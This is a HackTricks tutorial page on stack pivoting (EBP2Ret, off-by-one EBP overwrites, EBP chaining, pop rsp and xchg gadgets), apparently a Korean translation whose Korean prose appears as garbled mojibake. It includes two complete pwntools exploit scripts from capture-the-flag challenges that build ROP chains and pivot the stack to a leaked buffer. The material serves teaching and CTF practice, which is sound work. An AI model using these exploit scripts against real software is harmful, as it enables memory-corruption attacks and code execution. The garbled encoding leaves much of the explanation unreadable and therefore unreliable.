# Stack Pivoting - EBP2Ret - EBP chaining

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

ì´ ê¸°ìˆ ì€ **Base Pointer (EBP)**ë¥¼ ì¡°ì‘í•˜ì—¬ EBP ë ˆì§€ìŠ¤í„°ì™€ `leave; ret` ëª…ë ¹ì–´ ì‹œí€€ìŠ¤ë¥¼ ì‹ ì¤‘í•˜ê²Œ ì‚¬ìš©í•˜ì—¬ ì—¬ëŸ¬ í•¨ìˆ˜ì˜ ì‹¤í–‰ì„ ì—°ê²°í•˜ëŠ” ëŠ¥ë ¥ì„ ì´ìš©í•©ë‹ˆë‹¤.

ìƒê¸° ì‚¬í•­ìœ¼ë¡œ, **`leave`**ëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ë‹¤ìŒì„ ì˜ë¯¸í•©ë‹ˆë‹¤:
```
mov               esp, ebp
pop               ebp
ret
```
And as the **EBP is in the stack** before the EIP it's possible to control it controlling the stack.

### EBP2Ret

ì´ ê¸°ìˆ ì€ **EBP ë ˆì§€ìŠ¤í„°ë¥¼ ë³€ê²½í•  ìˆ˜ ìˆì§€ë§Œ EIP ë ˆì§€ìŠ¤í„°ë¥¼ ì§ì ‘ ë³€ê²½í•  ë°©ë²•ì´ ì—†ì„ ë•Œ** íŠ¹íˆ ìœ ìš©í•©ë‹ˆë‹¤. í•¨ìˆ˜ê°€ ì‹¤í–‰ì„ ë§ˆì¹  ë•Œì˜ ë™ì‘ì„ í™œìš©í•©ë‹ˆë‹¤.

`fvuln` ì‹¤í–‰ ì¤‘ì—, **ê°€ì§œ EBP**ë¥¼ ìŠ¤íƒì— ì£¼ì…í•˜ì—¬ ì‰˜ì½”ë“œ ì£¼ì†Œê°€ ìœ„ì¹˜í•œ ë©”ëª¨ë¦¬ ì˜ì—­ì„ ê°€ë¦¬í‚¤ê²Œ í•  ìˆ˜ ìˆë‹¤ë©´(plus 4 bytes to account for the `pop` operation), EIPë¥¼ ê°„ì ‘ì ìœ¼ë¡œ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. `fvuln`ì´ ë°˜í™˜ë˜ë©´, ESPëŠ” ì´ ì¡°ì‘ëœ ìœ„ì¹˜ë¡œ ì„¤ì •ë˜ê³ , ì´í›„ì˜ `pop` ì‘ì—…ì€ ESPë¥¼ 4ë§Œí¼ ê°ì†Œì‹œì¼œ **ì‹¤ì œë¡œ ê³µê²©ìê°€ ê·¸ê³³ì— ì €ì¥í•œ ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ê²Œ ë§Œë“­ë‹ˆë‹¤.**\
ì—¬ê¸°ì„œ **2ê°œì˜ ì£¼ì†Œë¥¼ ì•Œì•„ì•¼ í•œë‹¤ëŠ” ì ì— ìœ ì˜í•˜ì„¸ìš”**: ESPê°€ ì´ë™í•  ì£¼ì†Œì™€, ESPê°€ ê°€ë¦¬í‚¤ëŠ” ì£¼ì†Œë¥¼ ì¨ì•¼ í•  ì£¼ì†Œì…ë‹ˆë‹¤.

#### Exploit Construction

ë¨¼ì €, **ì„ì˜ì˜ ë°ì´í„° / ì£¼ì†Œë¥¼ ì“¸ ìˆ˜ ìˆëŠ” ì£¼ì†Œ**ë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ESPëŠ” ì—¬ê¸°ë¡œ ê°€ë¦¬í‚¤ê³  **ì²« ë²ˆì§¸ `ret`**ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.

ê·¸ ë‹¤ìŒ, **ì„ì˜ì˜ ì½”ë“œë¥¼ ì‹¤í–‰í• ** `ret`ì—ì„œ ì‚¬ìš©ë˜ëŠ” ì£¼ì†Œë¥¼ ì•Œì•„ì•¼ í•©ë‹ˆë‹¤. ë‹¤ìŒì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* ìœ íš¨í•œ [**ONE\_GADGET**](https://github.com/david942j/one\_gadget) ì£¼ì†Œ.
* **`system()`**ì˜ ì£¼ì†Œ ë’¤ì— **4ê°œì˜ ì“°ë ˆê¸° ë°”ì´íŠ¸**ì™€ `"/bin/sh"`ì˜ ì£¼ì†Œ(x86 bits).
* **`jump esp;`** ê°€ì ¯([**ret2esp**](ret2esp-ret2reg.md))ì˜ ì£¼ì†Œ ë’¤ì— **ì‹¤í–‰í•  ì‰˜ì½”ë“œ**.
* ì¼ë¶€ [**ROP**](rop-return-oriented-programing.md) ì²´ì¸.

ì œì–´ëœ ë©”ëª¨ë¦¬ ë¶€ë¶„ì˜ ì´ëŸ¬í•œ ì£¼ì†Œ ì•ì—ëŠ” **`4` ë°”ì´íŠ¸**ê°€ ìˆì–´ì•¼ í•©ë‹ˆë‹¤. ì´ëŠ” **`pop`** ë¶€ë¶„ì˜ `leave` ëª…ë ¹ì–´ ë•Œë¬¸ì…ë‹ˆë‹¤. ì´ 4Bë¥¼ ì•…ìš©í•˜ì—¬ **ë‘ ë²ˆì§¸ ê°€ì§œ EBP**ë¥¼ ì„¤ì •í•˜ê³  ì‹¤í–‰ì„ ê³„ì† ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

#### Off-By-One Exploit

ì´ ê¸°ìˆ ì˜ íŠ¹ì • ë³€í˜•ì¸ "Off-By-One Exploit"ì´ ìˆìŠµë‹ˆë‹¤. ì´ëŠ” **EBPì˜ ê°€ì¥ í•˜ìœ„ ë°”ì´íŠ¸ë§Œ ìˆ˜ì •í•  ìˆ˜ ìˆì„ ë•Œ** ì‚¬ìš©ë©ë‹ˆë‹¤. ì´ ê²½ìš°, **`ret`**ë¡œ ì í”„í•  ì£¼ì†Œë¥¼ ì €ì¥í•˜ëŠ” ë©”ëª¨ë¦¬ ìœ„ì¹˜ëŠ” EBPì™€ ì²« ì„¸ ë°”ì´íŠ¸ë¥¼ ê³µìœ í•´ì•¼ í•˜ë©°, ë” ì œí•œëœ ì¡°ê±´ì—ì„œ ìœ ì‚¬í•œ ì¡°ì‘ì´ ê°€ëŠ¥í•˜ê²Œ í•©ë‹ˆë‹¤.

### **EBP Chaining**

ë”°ë¼ì„œ ìŠ¤íƒì˜ `EBP` í•­ëª©ì— ì œì–´ëœ ì£¼ì†Œë¥¼ ë„£ê³  `EIP`ì— `leave; ret` ì£¼ì†Œë¥¼ ë„£ìœ¼ë©´, **ìŠ¤íƒì—ì„œ ì œì–´ëœ `EBP` ì£¼ì†Œë¡œ `ESP`ë¥¼ ì´ë™ì‹œí‚¬ ìˆ˜ ìˆìŠµë‹ˆë‹¤.**

ì´ì œ **`ESP`**ëŠ” ì›í•˜ëŠ” ì£¼ì†Œë¥¼ ê°€ë¦¬í‚¤ë„ë¡ ì œì–´ë˜ê³ , ë‹¤ìŒ ì‹¤í–‰í•  ëª…ë ¹ì€ `RET`ì…ë‹ˆë‹¤. ì´ë¥¼ ì•…ìš©í•˜ê¸° ìœ„í•´ ì œì–´ëœ ESP ìœ„ì¹˜ì— ë‹¤ìŒì„ ë°°ì¹˜í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤:

* **`&(next fake EBP)`** -> `leave` ëª…ë ¹ì–´ì˜ `pop ebp`ë¡œ ì¸í•´ ìƒˆë¡œìš´ EBPë¥¼ ë¡œë“œí•©ë‹ˆë‹¤.
* **`system()`** -> `ret`ì— ì˜í•´ í˜¸ì¶œë©ë‹ˆë‹¤.
* **`&(leave;ret)`** -> ì‹œìŠ¤í…œì´ ì¢…ë£Œëœ í›„ í˜¸ì¶œë˜ë©°, ESPë¥¼ ê°€ì§œ EBPë¡œ ì´ë™ì‹œí‚¤ê³  ë‹¤ì‹œ ì‹œì‘í•©ë‹ˆë‹¤.
* **`&("/bin/sh")`**-> `system`ì˜ ë§¤ê°œë³€ìˆ˜ì…ë‹ˆë‹¤.

ê¸°ë³¸ì ìœ¼ë¡œ ì´ ë°©ë²•ìœ¼ë¡œ ì—¬ëŸ¬ ê°œì˜ ê°€ì§œ EBPë¥¼ ì—°ê²°í•˜ì—¬ í”„ë¡œê·¸ë¨ì˜ íë¦„ì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ê²ƒì€ [ret2lib](ret2lib/)ì™€ ë¹„ìŠ·í•˜ì§€ë§Œ, ëª…ë°±í•œ ì´ì  ì—†ì´ ë” ë³µì¡í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ì¼ë¶€ ì—£ì§€ ì¼€ì´ìŠ¤ì—ì„œëŠ” í¥ë¯¸ë¡œìš¸ ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ë˜í•œ, ì—¬ê¸°ì—ì„œ **ìŠ¤íƒ ëˆ„ìˆ˜**ë¥¼ ì‚¬ìš©í•˜ì—¬ ìŠ¹ë¦¬í•˜ëŠ” í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ëŠ” [**ì±Œë¦°ì§€ì˜ ì˜ˆ**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/leave)ê°€ ìˆìŠµë‹ˆë‹¤. ì´ê²ƒì€ í˜ì´ì§€ì˜ ìµœì¢… í˜ì´ë¡œë“œì…ë‹ˆë‹¤:
```python
from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16)
log.success(f'Buffer: {hex(buffer)}')

LEAVE_RET = 0x40117c
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229

payload = flat(
0x0,               # rbp (could be the address of anoter fake RBP)
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,
elf.sym['winner']
)

payload = payload.ljust(96, b'A')     # pad to 96 (just get to RBP)

payload += flat(
buffer,         # Load leak address in RBP
LEAVE_RET       # Use leave ro move RSP to the user ROP chain and ret to execute it
)

pause()
p.sendline(payload)
print(p.recvline())
```
## EBPëŠ” ì“¸ëª¨ê°€ ì—†ë‹¤

[**ì´ í¬ìŠ¤íŠ¸ì—ì„œ ì„¤ëª…ëœ ë°”ì™€ ê°™ì´**](https://github.com/florianhofhammer/stack-buffer-overflow-internship/blob/master/NOTES.md#off-by-one-1), ë°”ì´ë„ˆë¦¬ê°€ ì¼ë¶€ ìµœì í™”ì™€ í•¨ê»˜ ì»´íŒŒì¼ë˜ë©´, **EBPëŠ” ESPë¥¼ ì œì–´í•  ìˆ˜ ì—†ë‹¤**, ë”°ë¼ì„œ EBPë¥¼ ì œì–´í•˜ì—¬ ì‘ë™í•˜ëŠ” ì–´ë–¤ ìµìŠ¤í”Œë¡œì‡ë„ ê¸°ë³¸ì ìœ¼ë¡œ ì‹¤íŒ¨í•˜ê²Œ ëœë‹¤.\
ì´ëŠ” **í”„ë¡œë¡¤ë¡œê·¸ì™€ ì—í•„ë¡œê·¸ê°€** ë°”ì´ë„ˆë¦¬ê°€ ìµœì í™”ë˜ë©´ ë³€ê²½ë˜ê¸° ë•Œë¬¸ì´ë‹¤.

* **ìµœì í™”ë˜ì§€ ì•ŠìŒ:**
```bash
push   %ebp         # save ebp
mov    %esp,%ebp    # set new ebp
sub    $0x100,%esp  # increase stack size
.
.
.
leave               # restore ebp (leave == mov %ebp, %esp; pop %ebp)
ret                 # return
```
* **ìµœì í™”ë¨:**
```bash
push   %ebx         # save ebx
sub    $0x100,%esp  # increase stack size
.
.
.
add    $0x10c,%esp  # reduce stack size
pop    %ebx         # restore ebx
ret                 # return
```
## RSPë¥¼ ì œì–´í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•

### **`pop rsp`** ê°€ì ¯

[**ì´ í˜ì´ì§€ì—ì„œ**](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp) ì´ ê¸°ìˆ ì„ ì‚¬ìš©í•˜ëŠ” ì˜ˆì œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ ë„ì „ ê³¼ì œì—ì„œëŠ” 2ê°œì˜ íŠ¹ì • ì¸ìˆ˜ë¥¼ ê°€ì§„ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•´ì•¼ í–ˆìœ¼ë©°, **`pop rsp` ê°€ì ¯**ì´ ìˆì—ˆê³  **ìŠ¤íƒì—ì„œì˜ leak**ì´ ìˆì—ˆìŠµë‹ˆë‹¤:
```python
# Code from https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting/exploitation/pop-rsp
# This version has added comments

from pwn import *

elf = context.binary = ELF('./vuln')
p = process()

p.recvuntil('to: ')
buffer = int(p.recvline(), 16) # Leak from the stack indicating where is the input of the user
log.success(f'Buffer: {hex(buffer)}')

POP_CHAIN = 0x401225       # pop all of: RSP, R13, R14, R15, ret
POP_RDI = 0x40122b
POP_RSI_R15 = 0x401229     # pop RSI and R15

# The payload starts
payload = flat(
0,                 # r13
0,                 # r14
0,                 # r15
POP_RDI,
0xdeadbeef,
POP_RSI_R15,
0xdeadc0de,
0x0,               # r15
elf.sym['winner']
)

payload = payload.ljust(104, b'A')     # pad to 104

# Start popping RSP, this moves the stack to the leaked address and
# continues the ROP chain in the prepared payload
payload += flat(
POP_CHAIN,
buffer             # rsp
)

pause()
p.sendline(payload)
print(p.recvline())
```
### xchg \<reg>, rsp ê°€ì ¯
```
pop <reg>                <=== return pointer
<reg value>
xchg <reg>, rsp
```
## References

* [https://bananamafia.dev/post/binary-rop-stackpivot/](https://bananamafia.dev/post/binary-rop-stackpivot/)
* [https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting](https://ir0nstone.gitbook.io/notes/types/stack/stack-pivoting)

{% hint style="success" %}
AWS í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP í•´í‚¹ ë°°ìš°ê¸° ë° ì—°ìŠµí•˜ê¸°: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… ê³„íš**](https://github.com/sponsors/carlospolop) í™•ì¸í•˜ê¸°!
* **ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ì°¸ì—¬í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **[**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) ê¹ƒí—ˆë¸Œ ë¦¬í¬ì§€í† ë¦¬ì— PRì„ ì œì¶œí•˜ì—¬ í•´í‚¹ íŒì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
{% endhint %}
